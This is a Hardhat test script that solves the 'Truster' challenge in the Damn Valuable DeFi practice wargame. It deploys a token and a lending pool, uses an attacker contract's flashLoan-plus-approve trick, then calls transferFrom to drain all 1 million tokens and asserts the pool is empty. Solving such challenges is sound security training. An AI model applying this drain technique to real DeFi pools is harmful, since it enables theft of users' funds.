import { ethers } from "hardhat";
import { expect } from "chai";

describe("Truster Challenge", function () {
    it("Exploit", async () => {
        const [deployer, attacker] = await ethers.getSigners();

        const DVT = await ethers.getContractFactory("DamnValuableToken");
        const dvt = await DVT.deploy();

        const Pool = await ethers.getContractFactory("TrusterLenderPool");
        const pool = await Pool.deploy(await dvt.getAddress());

        // Fund pool with 1 million DVT
        await dvt.transfer(await pool.getAddress(), ethers.parseEther("1000000"));

        const balanceBefore = await dvt.balanceOf(await attacker.getAddress());
        expect(await dvt.balanceOf(pool.getAddress())).to.equal(ethers.parseEther("1000000"));
        expect(balanceBefore).to.equal(0n);

        // Deploy exploit contract
        const Attacker = await ethers.getContractFactory("TrusterAttacker");
        const attackerContract = await Attacker.connect(attacker).deploy();

        // Trigger the attack (flashLoan + approve)
        await attackerContract.connect(attacker).attack(
            await pool.getAddress(),
            await dvt.getAddress(),
            await attacker.getAddress()
        );

        // Now that attacker is approved, transferFrom to self
        await dvt.connect(attacker).transferFrom(
            await pool.getAddress(),
            await attacker.getAddress(),
            await dvt.balanceOf(await pool.getAddress())
        );


        // Expect attacker has drained the pool
        expect(await dvt.balanceOf(pool.getAddress())).to.equal(0n);
        expect(await dvt.balanceOf(await attacker.getAddress())).to.equal(ethers.parseEther("1000000"));
    });
});
